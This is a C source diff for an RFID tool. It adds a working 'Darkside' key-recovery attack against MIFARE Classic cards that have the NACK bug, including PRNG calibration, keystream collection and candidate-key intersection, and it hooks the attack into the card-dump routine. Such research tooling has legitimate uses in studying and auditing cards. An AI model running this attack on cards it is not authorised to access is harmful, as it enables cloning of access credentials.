@@ -420,17 +420,13 @@ int mfAuth(u8 block, const u8 key[6], bool keyB, Crypto1 *c)
 	return authCmd(keyB ? 0x61 : 0x60, block, key, c, NULL);
 }
 
-int mfChkKeys(u8 block, bool keyB, const u8 (*keys)[6], int n)
+// The re-select + AUTH part of the chip ops' arg (OP_CHKKEYS, OP_DARKSIDE): nsteps, HLTA (no answer),
+// WUPA (7 bits), a SELECT per cascade level as iso14aSelect sends them, then the AUTH command's code,
+// length and parity-packed frame. Returns the end.
+static u8 *selectAuthArg(u8 *p, u8 block, bool keyB)
 {
-	if (card.uidLen != 4 && card.uidLen != 7 && card.uidLen != 10) FAIL(-2, "no card");
-	u8 a[250], *p = a;
-	u32 uid = cardUid(), nr = 0x12345678;
-	for (int i = 0; i < 4; i++) *p++ = uid >> (24 - 8 * i);
-	for (int i = 0; i < 4; i++) *p++ = nr >> (24 - 8 * i);
-	*p++ = MF_AT_WAIT & 0xFF, *p++ = MF_AT_WAIT >> 8;
 	int levels = card.uidLen / 3;
 	*p++ = 2 + levels;
-	// HLTA (no answer), WUPA (7 bits), a SELECT per cascade level: as iso14aSelect sends them
 	*p++ = 1, *p++ = 0x40, *p++ = 0, *p++ = 4, *p++ = 0x50, *p++ = 0x00;
 	crcA(p - 2, 2, p);
 	p += 2;
@@ -448,7 +444,18 @@ int mfChkKeys(u8 block, bool keyB, const u8 (*keys)[6], int n)
 	crcA(cmd, 2, cmd + 2);
 	u32 fl = mfPack(cmd, 4, NULL, p + 2, &code);
 	p[0] = code, p[1] = fl;
-	p += 2 + fl;
+	return p + 2 + fl;
+}
+
+int mfChkKeys(u8 block, bool keyB, const u8 (*keys)[6], int n)
+{
+	if (card.uidLen != 4 && card.uidLen != 7 && card.uidLen != 10) FAIL(-2, "no card");
+	u8 a[250], *p = a;
+	u32 uid = cardUid(), nr = 0x12345678;
+	for (int i = 0; i < 4; i++) *p++ = uid >> (24 - 8 * i);
+	for (int i = 0; i < 4; i++) *p++ = nr >> (24 - 8 * i);
+	*p++ = MF_AT_WAIT & 0xFF, *p++ = MF_AT_WAIT >> 8;
+	p = selectAuthArg(p, block, keyB);
 	int per = (a + sizeof(a) - p - 1) / 6;
 	for (int base = 0; base < n; base += per) {
 		int m = n - base < per ? n - base : per;
@@ -813,6 +820,133 @@ int mfNestedRecover(u8 kb, const u8 key[6], bool knownB, u8 tb, bool tgtB, u8 ke
 	if (r || mfCancel || !nestedWindow) return r;
 	logp("  nested: %s; again\n", why);
 	return nestedOnce(kb, key, knownB, tb, tgtB, keyOut);
+}
+
+// Darkside (NACK bug, NOTES.md "Darkside / NACK-bug"): a keyless attack for cards that answer a wrong
+// {nr}{ar} with an encrypted 4-bit NACK whatever its parity (FM11RF32N batch). For one tag nonce and a
+// fixed reader nonce, the 8 NACKs over nt_diff (top 3 bits of nr's last byte) narrow the key to ~100k
+// candidates (crapto1_darkside); runs with different nonces intersect to the key. The card's PRNG
+// free-runs, so the chip fires its AUTHs about one PRNG period apart and steers onto one nonce; the
+// period and ticks per step are calibrated here from nonce pairs the op samples.
+#define DS_NR    0xAABBCC00 // fixed on-wire reader nonce; the low 5 bits of the last byte stay 0
+#define DS_AR    0x11223344 // fixed on-wire reader response
+#define DS_ATW   5000       // ticks to wait for the NACK
+#define DS_PROBE 6000       // grid spacing (ticks) for measuring ticks per PRNG step
+#define DS_ITER  40         // AUTHs per collecting run (one PRNG period, ~79 ms, apart)
+#define DS_RUNS  12         // collecting runs before giving up
+#define DS_CHECK 64         // candidates few enough to try on the card
+
+typedef struct {
+	u32 nt, nt1; // the locked nonce (calibration: the first) and the second
+	u8 ks[8], mask, hits;
+} DsRun;
+
+static int dsRun(u8 *a, u32 len, u32 sync, u32 tq, u16 maxiter, DsRun *o)
+{
+	u8 out[MON_DARKSIDE_OUT];
+	for (int i = 0; i < 4; i++) a[i] = sync >> (8 * i);
+	a[4] = a[5] = 0; // sfracq: the op learns the drift
+	a[6] = maxiter, a[7] = maxiter >> 8;
+	a[8] = DS_ATW & 0xFF, a[9] = DS_ATW >> 8;
+	a[10] = tq, a[11] = tq >> 8;
+	if (monDarkside(a, len, NRAR_TX, out) < 0) FAIL(-1, "darkside: monitor");
+	o->nt = out[0] | out[1] << 8 | out[2] << 16 | (u32)out[3] << 24;
+	o->nt1 = out[13] | out[14] << 8 | out[15] << 16 | (u32)out[16] << 24;
+	memcpy(o->ks, out + 4, 8);
+	o->mask = out[12];
+	o->hits = out[17];
+	return 0;
+}
+
+// Signed PRNG distance a -> b within half a period (pm3 dist_nt); false if unrelated or not sampled.
+static bool dsDist(u32 a, u32 b, int *d)
+{
+	if (!a || !b) return false;
+	u32 x = a, y = b;
+	for (int i = 0; i < 32768; i++, x = prngSuccessor(x, 1), y = prngSuccessor(y, 1)) {
+		if (x == b) return *d = i, true;
+		if (y == a) return *d = -i, true;
+	}
+	return false;
+}
+
+int mfDarkside(u8 block, bool keyB, u8 keyOut[6])
+{
+	if (card.uidLen != 4 && card.uidLen != 7 && card.uidLen != 10) FAIL(0, "no card");
+	u8 a[250], *p = selectAuthArg(a + 12, block, keyB), zero[8] = { 0 }, code;
+	for (int c = 0; c < 8; c++) { // {nr}{ar} per nt_diff, fake (all-zero) parity
+		u32 nr = DS_NR | c << 5;
+		u8 b[8];
+		for (int i = 0; i < 4; i++) b[i] = nr >> (24 - 8 * i), b[4 + i] = (u32)DS_AR >> (24 - 8 * i);
+		p += mfPack(b, 8, zero, p, &code);
+	}
+	u32 len = p - a, uid = cardUid();
+	DsRun r;
+	int d;
+	u64 t0 = osGetTime();
+
+	// Ticks per PRNG step, from two AUTHs DS_PROBE ticks apart.
+	progOp("Darkside: calibrating");
+	double tps = 0;
+	for (int t = 0; t < 8 && !tps && !mfCancel; t++) {
+		if (dsRun(a, len, DS_PROBE, 0, 2, &r) < 0) return -1;
+		if (dsDist(r.nt, r.nt1, &d) && d) tps = (double)DS_PROBE / abs(d);
+	}
+	if (!tps) FAIL(0, mfCancel ? "stopped" : "darkside: no nonces to calibrate");
+	// Grid spacing = one PRNG period (65535 steps): the per-fire nonce advance is deterministic, so
+	// close the loop on it until it is well inside the op's steering window.
+	u32 sync = 65535 * tps + 0.5, tq = tps * 256 + 0.5;
+	for (int t = 0; t < 16 && !mfCancel; t++) {
+		progStep(t, 16);
+		if (dsRun(a, len, sync, 0, 2, &r) < 0) return -1;
+		if (!dsDist(r.nt, r.nt1, &d)) continue;
+		if (abs(d) <= 8) break;
+		sync -= (int)(d * tps + (d < 0 ? -0.5 : 0.5));
+	}
+	logp("  darkside: %.3f ticks/step, sync %lu (%llu ms)\n", tps, sync, osGetTime() - t0);
+
+	u64 *common = NULL;
+	int nc = 0, runs = 0;
+	for (int t = 0; t < DS_RUNS && !mfCancel; t++) {
+		progOp("Darkside: run %d (%d complete)", t + 1, runs);
+		progStep(t, DS_RUNS);
+		if (dsRun(a, len, sync, tq, DS_ITER, &r) < 0) return free(common), -1;
+		if (r.mask != 0xFF) {
+			logp("  darkside: incomplete (mask %02X, %d hits)\n", r.mask, r.hits);
+			continue;
+		}
+		// Only the keys also in the earlier runs' list. The common-prefix recovery misses the key now
+		// and then (~1 run in 10, pm3's too): with nothing in common, go on from this run's whole
+		// list, as pm3 does.
+		int n = 0;
+		u64 *cand = common ? crapto1_darkside(uid, r.nt, DS_NR, r.ks, common, nc, &n) : NULL;
+		if (!n) free(cand), cand = crapto1_darkside(uid, r.nt, DS_NR, r.ks, NULL, 0, &n);
+		if (!cand) { // a huge list (~1 run in 20 has over a million candidates): skip this nonce
+			logp("  darkside: out of memory, another run\n");
+			if (common) free(common), common = NULL;
+			continue;
+		}
+		free(common);
+		runs++;
+		logp("  darkside: run %d nt %08lX (%d hits), %d candidates (%llu ms)\n", runs, r.nt, r.hits, n,
+			osGetTime() - t0);
+		common = cand, nc = n;
+		if (nc > DS_CHECK) continue;
+		u8 keys[DS_CHECK][6];
+		for (int i = 0; i < nc; i++) keyBytes(common[i], keys[i]);
+		int h = mfChkKeys(block, keyB, (const u8 (*)[6])keys, nc);
+		if (h == -3) return free(common), -1;
+		if (h >= 0) {
+			memcpy(keyOut, keys[h], 6);
+			free(common);
+			logp("  darkside: key in %llu ms\n", osGetTime() - t0);
+			return 1;
+		}
+		free(common), common = NULL; // none auths (a miss on both sides of a match?): start over
+	}
+	free(common);
+	if (mfCancel) FAIL(0, "stopped");
+	FAIL(0, runs ? "darkside: no key from %d runs" : "darkside: no complete run (no NACK bug?)", runs);
 }
 
 // Encrypted WRITE data frame (16 bytes + CRC = 162 bits with parity). Long bit-mode frames are
@@ -1572,6 +1706,25 @@ int mfDumpCard(MfDump *d, int sectors, const u8 (*keys)[6], int nkeys)
 	int pivotSec = -1; bool pivotB = false;
 	for (int c = 0; c < 2 * sectors && pivotSec < 0; c++)
 		if (d->keyFound[c / 2][c % 2]) pivotSec = c / 2, pivotB = c % 2, mfProg.pivot = true;
+
+	// No key at all: darkside (cards with the NACK bug) for one, as the nested pivot.
+	if (pivotSec < 0 && !mfCancel) {
+		u8 rk[6];
+		logp("sector  0 A: darkside...\n");
+		mfProg.key[0][0] = MF_KEY_TRYING;
+		int r = mfDarkside(mfFirstBlock(0), false, rk);
+		if (r < 0) return -1;
+		mfProg.key[0][0] = MF_KEY_OPEN;
+		if (!r) logp("  darkside: %s\n", mfWhy());
+		else {
+			logp("  recovered %02X%02X%02X%02X%02X%02X\n", rk[0], rk[1], rk[2], rk[3], rk[4], rk[5]);
+			if (readSector(d, 0, rk, false) < 0) return -1;
+			if (d->keyFound[0][0]) {
+				pivotSec = 0, pivotB = false, mfProg.pivot = true;
+				ndict = addKey(dict, ndict, MF_MAX_KEYS, d->keys[0][0]);
+			}
+		}
+	}
 
 	// Sweep until a full pass turns up nothing new: recover EVERY missing A/B key, folding each
 	// one back into the dictionary so later sectors can reuse it before falling back to nested.
